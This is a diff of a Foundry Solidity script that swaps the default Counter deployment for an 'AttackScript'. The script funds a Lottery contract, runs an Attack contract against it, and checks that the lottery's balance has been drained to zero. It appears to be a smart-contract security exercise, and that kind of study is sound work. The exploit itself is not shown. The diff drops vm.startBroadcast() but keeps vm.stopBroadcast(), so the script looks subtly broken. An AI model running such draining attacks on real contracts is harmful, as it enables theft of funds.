@@ -1,19 +1,19 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.13;
+pragma solidity 0.8.26;
 
-import {Script, console} from "forge-std/Script.sol";
-import {Counter} from "../src/Counter.sol";
+import {Script} from "forge-std/Script.sol";
 
-contract CounterScript is Script {
-    Counter public counter;
+import {Attack} from "../src/Attack.sol";
+import {Lottery} from "../src/Lottery.sol";
 
-    function setUp() public {}
+contract AttackScript is Script {
+    uint256 constant AMOUNT = 0.5 ether;
 
     function run() public {
-        vm.startBroadcast();
-
-        counter = new Counter();
-
+        Lottery lottery = new Lottery{value: AMOUNT}();
+        Attack attack = new Attack(lottery);
+        attack.attack{value: AMOUNT}();
+        require(address(lottery).balance == 0, "attack failed");
         vm.stopBroadcast();
     }
 }
